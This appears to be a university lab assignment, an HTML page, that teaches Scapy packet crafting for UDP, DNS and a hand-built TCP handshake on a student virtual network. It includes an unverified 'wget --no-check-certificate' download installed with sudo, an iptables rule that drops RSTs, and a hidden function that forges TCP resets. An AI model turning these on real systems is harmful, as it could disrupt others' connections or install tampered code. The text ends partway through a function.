@@ -1,0 +1,869 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8" />
+<title>Scapy Layer-3 Assignment</title>
+<meta name="author" content="RAMontante"/>
+<meta name="date" content="2017-10-10"/>
+<base href="https://montcs.bloomu.edu" />
+<script type="text/javascript" src="/js/utilities.js"></script>
+<script type="text/javascript" src="/js/numQs.js"></script>
+<style type="text/css">
+@import url("/css/generic.css");
+@import url("/css/pagefmt.css");
+@import url("/css/assignment.css");
+
+body {
+    width:8.5in;
+    height:11in;
+    margin:0;
+    padding:0.5in;
+}
+
+em.smaller{font-weight:normal;color:#050}
+tt {font-family:monospace;font-size:125%;}
+
+
+h2 {
+    border-top:1px solid #000;
+    padding-top:1ex;
+    margin-top:4ex;
+}
+h3 { margin-bottom:1ex; margin-top:4ex;padding-top:0.5ex;border-top: 1px solid #ddd; }
+h4 { margin-bottom:1ex; }
+
+ol {margin-top:1ex;list-style-type:decimal;}
+ol ol {margin-top:1ex;list-style-type:lower-alpha;}
+ol li { margin-top:0ex; margin-bottom:1ex; padding:0;border-top:1px dotted #999;}
+
+.filter {
+    padding:2px;
+    color:#000;background:#dfd;
+    border:1px dotted #666;
+    font-weight:normal;
+}
+
+.code,
+code {
+    border:1px dotted #666;
+    padding-left:2px;padding-right:2px;margin-bottom:1.5ex;
+    color:#600;background:#e7e7e7;
+    font-size:105%;
+    font-weight:normal;
+}
+div.code {page-break-inside:avoid;}
+
+pre {background:#e7e7e7;padding:2px;}
+
+ul.pycode {
+    border:1px dotted #666;
+    padding-left:2px;padding-right:2px;margin-bottom:1.5ex;
+    margin-left:3em;
+    margin-top:0.5ex;
+    padding:2px;
+    list-style:outside '>>> ';
+    background:#ffd;
+}
+ul.code>li,
+ul.pycode>li {
+    border:none;
+    padding-top:0.2ex;
+    padding-bottom:0.0ex;
+    padding-left:4px;
+    margin-bottom:0.5ex;
+}
+
+ul.compact {
+    list-style: inside square;
+}
+
+div#title {
+    float:left;
+    font-size: 14pt;
+    font-weight: bold;
+    margin: 0;
+    padding: 0;
+    border:1px solid red;
+}
+div#title p {
+    width: 3.45in;
+    margin: 0ex 0em 0ex 2em;
+    text-indent: -2em;
+    padding: 0;
+}
+
+div#SigBlock {
+    float:left;
+    width:3in;height:0.75in;
+    vertical-align:top;
+    border:1px solid #000;padding:1em;
+}
+
+.answerline {
+    display:inline-block;
+    width:1in;
+    border-bottom:1px solid #000;
+}
+
+</style>
+<style type="text/css">
+.S0 {
+	color: #808080;
+}
+.S1 {
+	font-family:"URW Bookman L, Regular Italic","Gosmick Sans","Comic Sans MS","Papyrus","Purisa",fantasy;
+	color: #007F00;
+}
+.S2 {
+	color: #007F7F;
+}
+.S4 {
+	font-family: monospace;
+	color: #7F007F;
+}
+.S5 {
+	font-weight: bold;
+	color: #00007F;
+}
+.S9 {
+	font-weight: bold;
+	color: #007F7F;
+}
+.S10 {
+	font-weight: bold;
+	color: #000000;
+}
+span {
+	font-family: sans-serif;
+	color: #000000;
+}
+</style>
+</head>
+<body onload="numberItems('Question&nbsp;', 'inum');">
+<div id="title">
+<p class="asn">Scapy and the Transport Layer</p>
+</div><!-- title -->
+<div id="SigBlock" class="HIDE"><span class="">Name:</span></div>
+<!-- ==================================================================== -->
+
+<p class="clearboth">
+This assignment explores the Transport Layer, using the Python Scapy package.
+</p>
+<p>
+You need to do this exercise on your virtual network.
+(If you have set up a virtual network on your personal computer, you can do it there.)
+</p>
+
+<div class="smaller HIDE">
+<h3>assignment format</h3>
+<p>
+This assignment contains labeled, numbered questions that need written answers.
+Other questions are for you to think about, but don't need a written
+answer.
+</p>
+<p>
+Write the answers in a text file or word-processor document, then upload the file through
+the "Submit" link on the course webpage.
+You may also write out the answers by hand if necessary.
+</p>
+<p>
+ Format the answer file like this:
+</p>
+<div class="code inset smaller width550"><pre>
+    YOUR NAME
+    Assignment name/number
+    Date
+
+    1.  Answer to first question.
+        <em style="font-size:80%;color:#600">(Example:  "I installed the Windows version in a virtual
+        machine running DOS 3.21.  I started it using the DOS
+        command RUN WIRESHARK IN WINDOWS.  This doesn't work.")</em>
+
+    2.  Answer to second question.
+        <em style="font-size:80%;color:#600">(Example:  "My network interface is called Billy.")</em>
+
+    3.  Answer to third question.
+
+    ...  and so forth.
+</pre></div>
+</div>
+
+<h1>Craft Transport-layer headers using "scapy" in Python</h1>
+
+In this exercise you will use the "scapy" Python module to "craft" (create by hand) and send some UDP and TCP packets.
+These packets will explore some of the properties of UDP and TCP.
+You will need the scapy package, and you will need to enable the Windows FTP server.
+
+<ul><li>
+    <strong>Windows FTP server</strong>
+    <p>
+    You should already have enabled the FTP server on your Windows VM (in a previous lab).
+    If you haven't, follow the "Windows FTP Server" steps at <a href="/VM-LAN/LAN.servers.html#FTPserver">LAN.servers.html</a> to enable it.
+    </p>
+
+</li><li>
+    <strong>Linux scapy software</strong>
+    <p>
+    Set up the "scapy" package, which provides Python tools.
+    <br/>
+    (You may have done this already, in another lab.
+    If so, skip this step.)
+    </p>
+
+    <blockquote class="boxed">
+        <h4>Set up the scapy package in Linux</h4>
+        Scapy is a network-packet-manipulation package that runs under Python 2.5 or later.
+        You will install scapy in your Linux VM, which should have Python installed by default.
+        <p>
+        Scapy is available for python 3.x and also for python 2.x
+        The newer python 3.x is preferred and will be used for this exercise.
+
+        <h4>Python 3.x</h4>
+        Start your Linux VM, and open a terminal in it.
+        <p>
+        Obtain scapy and install it into python:
+        </p>
+        <ol><li>
+            Run the command
+<pre class="boxed">
+cd ~/
+<span class="HIDE">cp <strong>~/MadData/DIGFOR275-All/VM-LAN/scapy-master-python3.zip</strong>  ~/</span>
+<span class="">wget&nbsp;--no-check-certificate&nbsp;https://montcs.bloomu.edu/Networking/Software/VM-LAN/scapy-master-python3.zip</span> </pre>
+
+            to copy the package to your VM.
+
+        </li><li class="">
+            Unpack and install the package.
+            Enter these commands, one at a time:
+<pre class="boxed">
+unzip scapy-master-python3.zip
+
+cd scapy-master/
+sudo python3 setup.py install </pre>
+
+        </li><li class="">
+            Add graphic capabilities to scapy with this command:
+<pre class="boxed">
+sudo apt install texlive python3-pyx python3-matplotlib graphviz </pre>
+
+            This may take a few minutes.
+        </li></ol>
+    </blockquote>
+
+</li></ul>
+
+<!-- ============================================================= -->
+<h2 class="newpage">Prepare for using scapy</h2>
+Start your Windows VM and your Linux VM.
+
+<ol><li class="HIDE">
+    Find the address of your Windows VM as follows:
+    <ol class="compact"><li>
+        Start a command prompt on your Windows VM.
+
+    </li><li class="">
+        Run the command <code>ipconfig</code>.
+
+    </li><li class="">
+        Find the line that looks like
+        <br/>
+        <strong>"<tt>IPv4&nbsp;Address&nbsp;.&nbsp;.&nbsp;.&nbsp;.&nbsp;:&nbsp;10.0.2.14</tt></strong>".
+        <p>
+        The last number may be different, and is your Windows IP address.
+        </p>
+
+    </li><li class="HIDE">
+        Run the command <code>ipconfig/all</code>.
+
+    </li><li class="HIDE">
+        Find the line that looks like
+        <br/>
+        <strong>"<tt>Physical&nbsp;Address&nbsp;.&nbsp;.&nbsp;.&nbsp;.&nbsp;:&nbsp;08-00-27-58-78-29</tt></strong>".
+        <p>
+        The last part will be different, and is your Windows MAC address.
+        Windows shows MAC addresses as six hexadecimal numbers, separated by dashes (-).
+        However, most software writes MAC addresses with colons (:) instead of dashes.
+        </p>
+
+    </li></ol>
+
+</li><li class="HIDE">
+    Do these steps in a terminal on your Linux VM.
+    <ol class="compact"><li>
+        Run the command <code>ifconfig</code>.
+    </li><li class="HIDE">
+        The first line should look like
+        <br/>
+        <strong>"<tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enp0s3&nbsp;&nbsp;&nbsp;&nbsp;Link&nbsp;encap:Ethernet&nbsp;&nbsp;HWaddr&nbsp;08:00:27:3e:11:01</tt>"</strong>.
+        <p>
+        The last part will be different, and is your Linux MAC address.
+        </p>
+    </li><li>
+        The second line should look like
+        <br/>
+        <strong>"<tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inet&nbsp;addr:10.0.2.16&nbsp;&nbsp;Bcast:10.0.2.255&nbsp;&nbsp;Mask:255.255.255.0</tt>"</strong>.
+        <p>
+        The first part is your Linux IP address, the second part is the "broadcast address", and the last part is the "network mask" or "subnet mask".
+        The subnet mask describes which part of the IP address is the network itself, as opposed to the host part.
+        For this address, the first three numbers &mdash; 10.0.2 &mdash; are the network, and the last number &mdash; 16 &mdash; is the host.
+        The host changes from machine to machine, while the network should stay constant.
+        </p>
+    </li></ol>
+
+</li><li class="">
+    From your Linux VM's terminal, run the command <code>sudo wireshark</code>.
+    <ol class="compact"><li>
+        Click once on the "enp0s3" interface to select it.
+    </li><li>
+        Enter a <strong>capture filter</strong>:
+        <span class="filter">len &lt; 60 and not arp</span>
+    </li><li>
+        Press the &lt;Enter&gt; key to start the capture.
+    </li></ol>
+
+</li></ol>
+
+<!-- ============================================================= -->
+<h2>First looks at UDP</h2>
+These steps will create a "bare" UDP datagram and send it somewhere, then look at what scapy did.
+Many of the scapy commands have comments at their end, starting with <span class="fancyfont">#</span>; you don't need to type in the comments, they're just for your benefit (and mine!).
+<ol><li class="">
+    Start another terminal in your Linux VM.
+
+</li><li>
+    From the terminal run Python in "scapy mode" by entering these commands:
+<pre class="code">
+cd
+sudo scapy
+</pre>
+    It will prompt you for Python commands by showing the prompt "<tt style="color:#88f;">&gt;&gt;&gt;</tt>".
+
+</li><li>
+    Create a convenient variable for use later on.
+    Use your Windows VM's IP address in place of <span class="fake red">Windows-IP</span>.
+    <ul class="pycode"><li>
+        serverIP = "<span class="fake red">Windows-IP</span>"    <span class="smaller fancyfont green"># IP address IN QUOTES; use this below</span>
+    </li></ul>
+</li><li>
+    Create and look at a bare UDP datagram:
+    <ul class="pycode"><li>
+        bare = UDP()    <span class="smaller fancyfont green"># instantiate a datagram</span>
+    </li><li>
+        bare.show()    <span class="smaller fancyfont green"># See the UDP header fields</span>
+    </li><li>
+        bare.dport    <span class="smaller fancyfont green"># destination port's numerical value</span>
+    </li><li>
+        '{:04x}'.format(bare.dport)    <span class="smaller fancyfont green"># format destination port as hex</span>
+    </li><li>
+        len(bare)    <span class="smaller fancyfont green"># how long is the UDP header?</span>
+    </li></ul>
+    <p class="inum">
+    How many bytes long is the empty UDP datagram?
+    </p>
+    <p class="inum">
+    What are the default source and destination ports, in hexadecimal?
+    What are they, in base 10?
+    (Isn't that a coincidence?)
+    </p>
+
+</li><li>
+    Change the source port:
+    <ul class="pycode"><li>
+        bare.sport = 0x1234    <span class="smaller fancyfont green"># ephemeral source port, in hex</span>
+    </li><li>
+        bare.show()    <span class="smaller fancyfont green"># See the UDP header fields</span>
+    </li><li>
+        hexdump(bare)    <span class="smaller fancyfont green"># See the UDP header as bytes</span>
+    </li></ul>
+    <p class="inum">
+    What UDP source port value, in base 10?
+    </p>
+    <p class="inum">
+    Where in the frame is the UDP source port value?
+    How many bytes long is it?
+    </p>
+    <p class="inum">
+    Where in the frame is the UDP destination port value?
+    How many bytes long is it?
+    </p>
+
+</li><li>
+    Create a graphical representation of the frame with this command:
+    <ul class="pycode"><li>
+        bare.pdfdump('bare.pdf')    <span class="smaller fancyfont green"># create .pdf file of Ethernet headers</span>
+    </li></ul>
+    From a new terminal, issue the commands:
+<pre class="code">
+evince bare.pdf
+</pre>
+    This should show the UDP header fields in a more graphical format.
+
+</li><li>
+    Send this datagram out:
+    <ul class="pycode"><li>
+        send(IP(dst=serverIP)/bare)    <span class="smaller fancyfont green"># send to Windows VM</span>
+    </li></ul>
+    Look at the wireshark window.
+    You should see a UDP frame, followed by an ICMP frame.
+    <p class="">
+    Select the UDP frame.
+    In the middle pane, click on the "Ethernet II" line to select it &mdash; it will be highlighted in the bottom hexdump pane.
+    The remaining, unhighlighted bytes are the IP packet, and the UDP datagram itself.
+    </p>
+    <p class="">
+    Now click on the UDP line to select it; the UDP bytes become highlighted.
+    </p>
+    <p class="inum">
+    What are the length and checksum values for this datagram?
+    </p>
+
+</li></ol>
+
+<!-- ============================================================= -->
+<h2 class="">UDP with a payload, and a reply</h2>
+This activity will only work on campus, because the replying server is behind the campus firewall (so you have to be, too).
+
+<ol><li class="">
+    Create another UDP datagram, with a payload.
+    The payload must be Python's "bytes" datatype, not a simple "string", so you'll have to encode the string appropriately:
+    <ul class="pycode"><li>
+        small = UDP(dport=17, sport=0x2345)    <span class="smaller fancyfont green"># set different port values</span>
+    </li><li>
+        small.payload = 'hello, world'.encode('utf-8')    <span class="smaller fancyfont green"># utf-8 is widely used</span>
+    </li><li>
+        small.show()    <span class="smaller fancyfont green"># see the new UDP datagram</span>
+    </li><li>
+        small[Raw].show()    <span class="smaller fancyfont green"># payload only</span>
+    </li></ul>
+
+</li><li>
+    Send out this datagram, to a campus IP address.
+    A slightly different command is used because this one will generate a reply (only works while on campus, though):
+    <ul class="pycode"><li>
+        p2 = IP(dst='148.137.59.244')/small    <span class="smaller fancyfont green"># another packet</span>
+    </li><li>
+        p2.show()    <span class="smaller fancyfont green"># see the entire packet</span>
+    </li><li>
+        reply = sr1(p2)    <span class="smaller fancyfont green"># capture one reply</span>
+    </li><li>
+        reply.show()    <span class="smaller fancyfont green"># payload is raw bytes</span>
+    </li><li>
+        print(reply[Raw].load.decode('utf-8'))    <span class="smaller fancyfont green"># decode payload into text string</span>
+    </li></ul>
+
+</li><li>
+    Take another look at the reply:
+    <ul class="pycode"><li>
+        reply.summary()    <span class="smaller fancyfont green"># Scapy's idea of what's important in the reply</span>
+    </li></ul>
+
+</li><li>
+    Look at the reply graphically:
+    <ul class="pycode"><li>
+        reply.pdfdump('reply.pdf')    <span class="smaller fancyfont green"># create .pdf file
+    </li></ul>
+    From a terminal, issue the commands:
+<pre class="code">
+evince reply.pdf
+</pre>
+
+</li><li>
+    Compare the graphical output to the hexdump:
+    <ul class="pycode"><li>
+        hexdump(reply)
+    </li></ul>
+    You should see some of the same information.
+
+</li></ol>
+
+<!-- ============================================================= -->
+<h2 class="newpage">DNS in UDP</h2>
+UDP is used for DNS queries and replies, which occur with most web accesses. 
+In this activity you will create a DNS query, send it and get a reply, and extract the information from the reply.
+
+<ol><li class="">
+    Build a DNS message, and the encapsulating UDP datagram:
+    <ul class="pycode"><li>
+        server = 'montnet.bloomu.edu'
+    </li><li>
+        query = DNSQR(qname=server, qtype='A')
+    </li><li>
+        msg = DNS(opcode='QUERY', qd=query)
+    </li><li>
+        udp = UDP(dport=53, sport=53)    <span class="smaller fancyfont green"># use the default port #'s</span>
+    </li><li>
+        udp.payload = msg
+    </li></ul>
+
+</li><li>
+    You need to set a nameserver for the IP packet:
+    <ul class="pycode"><li>
+        nameserver = '148.137.11.15'
+    </li><li>
+        ipDNS = IP(dst=nameserver)
+    </li></ul>
+
+</li><li>
+    Send the DNS query and collect a reply:
+    <ul class="pycode"><li>
+        reply = sr1(ipDNS/udp)
+    </li><li>
+        reply.show()
+    </li></ul>
+    Also look at the reply graphically or as a hexdump, if you wish.
+
+</li><li>
+    Extract the answer:
+    <ul class="pycode"><li>
+        replyMessage = reply[DNS]
+    </li><li>
+        if replyMessage.an &nbsp;and&nbsp; replyMessage.an.rdata:
+        <br />&nbsp;&nbsp;&nbsp;&nbsp;serverIP = replyMessage.an.rdata
+        <br /><span class="fancyfont green">#----</span>
+    </li><li>
+        print(query.qname, serverIP)
+    </li></ul>
+    You could now use the information for further processing.
+
+</li></ol>
+
+<!-- ============================================================= -->
+<h2 class="">TCP three-way handshake</h2>
+The most common Transport-layer protocol is TCP.
+Unlike UDP, TCP requires that a connection be established before sending data.
+This is the <em>three-way handshake</em>, which scapy will not do automatically.
+You will try it out, then make a little function to do this.
+
+<ol><li class=""> <!-- ======== -->
+    The operating system does not like receiving TCP SYN/ACKs when it didn't issue a TCP SYN packet, so it responds with a TCP RST (Reset) to shut the connections down.
+    Use the Linux "iptables" firewall to block these Resets:
+    <ul class="pycode"><li>
+        fwRule = 'iptables %s OUTPUT -p tcp --tcp-flags RST RST --dport 21 -j DROP'
+    </li><li>
+        os.system(fwRule % '-A')
+    </li></ul>
+    You may need to wait a minute or two for the rule change to take effect.
+
+</li><li> <!-- ======== -->
+    If wireshark is still capturing, stop the capture.
+    <ul class="compact"><li>
+        Go to wireshark's "Capture" tab, and select "Options..."
+    </li><li>
+        Clear out the capture filter, and start a new capture.
+    </li><li>
+        Put the following display filter into wireshark
+        <span class="filter">ip.addr==<span class="fake red">Windows-IP</span>&nbsp;&amp;&amp;&nbsp;tcp.port==21</span>
+    </li></ul>
+    Then go back to scapy.
+
+</li><li>
+    Build an initial TCP/IP "SYN" packet, send it out, collect a response.
+    <ul class="pycode"><li>
+        dstport = 21
+    </li><li class="HIDE">
+        srcport = RandShort()
+    </li><li>
+        srcport = 12345
+    </li><li>
+        seqval = RandShort()
+    </li><li>
+        ipServer = IP(dst=serverIP)
+    </li><li>
+        syn = TCP(dport=dstport, sport=srcport, flags='S', seq=seqval)
+    </li><li>
+        ipServer = IP(dst=serverIP)
+    </li><li>
+        packet = ipServer/syn
+    </li><li>
+        packet.show()
+    </li><li>
+        response = sr1(packet)
+    </li><li>
+        response.show()    <span class="smaller fancyfont green"># should be a SYN/ACK</span>
+    </li></ul>
+    <p class="inum">
+    What is the TCP flags value?
+    </p>
+
+</li><li>
+    Look at the wireshark window.
+    You should see your SYN packet, followed by the server's SYN/ACK packet.
+    After a short time, more packets will appear.
+    <p class="inum">
+    How many seconds elapse before the server retransmits its SYN/ACK packet?
+    </p>
+
+</li><li>
+    Check that you got a SYN/ACK packet, and acknowledge it:
+    <ul class="pycode"><li>
+        if response[TCP].flags == 0x12:    <span class="smaller fancyfont green"># 'SA'</span>
+        <br />&nbsp;&nbsp;&nbsp;&nbsp;seqval += 1
+        <br />&nbsp;&nbsp;&nbsp;&nbsp;ackval = response[TCP].seq + 1
+        <br />&nbsp;&nbsp;&nbsp;&nbsp;ack = TCP(dport=80, flags='A', seq=seqval, ack=ackval)
+        <br />&nbsp;&nbsp;&nbsp;&nbsp;send(ipServer/ack)
+        <br />else:
+        <br />&nbsp;&nbsp;&nbsp;&nbsp;print('Oopsie!')
+    </li></ul>
+    <p>
+    Look at the wireshark window again.
+    Find your ACK packet.
+    Did the server send a RST (Reset) packet before you were able to send your ACK?
+    <p class="inum">
+    How many seconds elapsed between the server's SYN/ACK and your ACK?
+    </p>
+
+</li><li>
+    To complete the handshake in a timely fashion you need to set up <em>functions</em> that do the steps for you.
+    Enter the following into scapy:
+    <ul class="compact"><li>
+        Send an ACK:
+        <ul class="pycode"><li>
+<span class="S5">def</span><span class="S0"> </span><span class="S9">ack</span><span class="S10">(</span>rsp<span class="S10">):</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">if</span><span class="S0"> </span>TCP<span class="S0"> </span><span class="S5">not</span><span class="S0"> </span><span class="S5">in</span><span class="S0"> </span>rsp<span class="S10">:</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">return</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>ip<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>IP<span class="S10">(</span>dst<span class="S10">=</span>rsp<span class="S10">[</span>IP<span class="S10">].</span>src<span class="S10">,</span><span class="S0"> </span>src<span class="S10">=</span>rsp<span class="S10">[</span>IP<span class="S10">].</span>dst<span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>dport<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>sport<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>sport<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>dport<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>seqval<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>ack<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>payloadlength<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>IP<span class="S10">].</span>len<span class="S0"> </span><span class="S10">-</span><span class="S0"> </span><span class="S2">4</span><span class="S10">*(</span>rsp<span class="S10">[</span>IP<span class="S10">].</span>ihl<span class="S0"> </span><span class="S10">+</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>dataofs<span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>ackval<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>seq<span class="S0"> </span><span class="S10">+</span><span class="S0"> </span>payloadlength<span class="S0"> </span><span class="S10">+</span><span class="S0"> </span><span class="S2">1</span><span class="S0"> &nbsp;&nbsp;</span><span class="S1"># adding 1 seems not-quite-right, but needed?</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>ack<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>TCP<span class="S10">(</span>dport<span class="S10">=</span>dport<span class="S10">,</span><span class="S0"> </span>sport<span class="S10">=</span>sport<span class="S10">,</span><span class="S0"> </span>seq<span class="S10">=</span>seqval<span class="S10">,</span><span class="S0"> </span>ack<span class="S10">=</span>ackval<span class="S10">,</span><span class="S0"> </span>flags<span class="S10">=</span><span class="S4">'A'</span><span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>send<span class="S10">(</span>ip<span class="S10">/</span>ack<span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">print</span><span class="S10">(</span><span class="S4">'ack:'</span><span class="S10">,</span>payloadlength<span class="S10">,</span><span class="S0"> </span>ackval<span class="S10">)</span><br />
+<span class="S1">#--------</span><br />
+        </li></ul>
+
+    </li><li>
+        Create a connection via a 3-way handshake:
+        <ul class="pycode"><li>
+<span class="S5">def</span><span class="S0"> </span><span class="S9">handshake</span><span class="S10">(</span>dip<span class="S10">,</span><span class="S0"> </span>dport<span class="S10">,</span><span class="S0"> </span>sport<span class="S10">=</span><span class="S2">54321</span><span class="S10">):</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>ip<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>IP<span class="S10">(</span>dst<span class="S10">=</span>dip<span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>srcport<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>sport<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>seqval<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>RandShort<span class="S10">()</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>ackval<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span><span class="S2">0</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>syn<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>TCP<span class="S10">(</span>dport<span class="S10">=</span>dport<span class="S10">,</span><span class="S0"> </span>sport<span class="S10">=</span>srcport<span class="S10">,</span><span class="S0"> </span>seq<span class="S10">=</span>seqval<span class="S10">,</span><span class="S0"> </span>ack<span class="S10">=</span>ackval<span class="S10">,</span><span class="S0"> </span>flags<span class="S10">=</span><span class="S4">'S'</span><span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>response<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>sr1<span class="S10">(</span>ip<span class="S10">/</span>syn<span class="S10">)</span><span class="S1"> &nbsp;&nbsp;&nbsp;&nbsp;# should be a SYN/ACK packet</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>ack<span class="S10">(</span>response<span class="S10">)</span><span class="S1"> &nbsp;&nbsp;&nbsp;&nbsp;# call the ack() function</span><br />
+<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">if</span><span class="S0"> </span>response<span class="S10">[</span>TCP<span class="S10">].</span>flags<span class="S0"> </span><span class="S10">!=</span><span class="S0"> </span><span class="S2">0x12</span><span class="S10">:</span><span class="S0"> </span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="S1"># 0x012 --&gt; 'SA' flags</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">print</span><span class="S10">(</span><span class="S4">'Oopsie!'</span><span class="S10">,</span><span class="S0"> </span><span class="S4">'%#02x'</span><span class="S10">%</span>response<span class="S10">[</span>TCP<span class="S10">].</span>flags<span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">return</span><span class="S0"> </span>None<br />
+<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">return</span><span class="S0"> </span>response<span class="S0"></span><br />
+<span class="S1">#--------</span><br />
+        </li></ul>
+
+    </li><li class="HIDE">
+        Reset a connection:
+        <ul class="pycode"><li>
+<span class="S5">def</span><span class="S0"> </span><span class="S9">reset</span><span class="S10">(</span>rsp<span class="S10">):</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>ip<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>IP<span class="S10">(</span>dst<span class="S10">=</span>rsp<span class="S10">[</span>IP<span class="S10">].</span>src<span class="S10">,</span><span class="S0"> </span>src<span class="S10">=</span>rsp<span class="S10">[</span>IP<span class="S10">].</span>dst<span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>dport<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>sport<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>sport<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>dport<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>seqval<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>ack<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>payloadlength<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>IP<span class="S10">].</span>len<span class="S0"> </span><span class="S10">-</span><span class="S0"> </span><span class="S2">4</span><span class="S10">*(</span>rsp<span class="S10">[</span>IP<span class="S10">].</span>ihl<span class="S0"> </span><span class="S10">+</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>dataofs<span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>ackval<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>rsp<span class="S10">[</span>TCP<span class="S10">].</span>seq<span class="S0"> </span><span class="S10">+</span><span class="S0"> </span>payloadlength<br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>rst<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>TCP<span class="S10">(</span>dport<span class="S10">=</span>dport<span class="S10">,</span><span class="S0"> </span>sport<span class="S10">=</span>sport<span class="S10">,</span><span class="S0"> </span>seq<span class="S10">=</span>seqval<span class="S10">,</span><span class="S0"> </span>ack<span class="S10">=</span>ackval<span class="S10">,</span><span class="S0"> </span>flags<span class="S10">=</span><span class="S4">'RA'</span><span class="S10">)</span><br />
+<span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>send<span class="S10">(</span>ip<span class="S10">/</span>rst<span class="S10">)</span><br />
+        </li></ul>
+
+    </li></ul>
+
+</li><li>
+    <ul class="compact"><li>
+        Put things together:
+        <ul class="pycode"><li>
+    <span class="S5">def</span><span class="S0"> </span><span class="S9">probe</span><span class="S10">(</span>dip<span class="S10">,</span><span class="S0"> </span>dport<span class="S10">,</span><span class="S0"> </span>sport<span class="S10">=</span><span class="S2">54321</span><span class="S10">):</span><br />
+    <span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>response<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>handshake<span class="S10">(</span>dip<span class="S10">,</span><span class="S0"> </span>dport<span class="S10">,</span><span class="S0"> </span>sport<span class="S10">)</span><span class="S0"> &nbsp;&nbsp;</span><span class="S1"># should be the SYN/ACK packet</span><br />
+    <span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">if</span><span class="S0"> </span><span class="S5">not</span><span class="S0"> </span>response<span class="S10">:</span><br />
+    <span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="S5">return</span><span class="S0"> </span>None<br />
+    <span class="S0">&nbsp;&nbsp;&nbsp;&nbsp;</span>r<span class="S0"> </span><span class="S10">=</span><span class="S0"> </span>sniff<span class="S10">(</span>count<span class="S10">=</span><span class="S2">2</span><span class="S10">,</span><span class="S0"> </span>prn<span class="S10">=</span>ack<span class="S10">)</span><br />
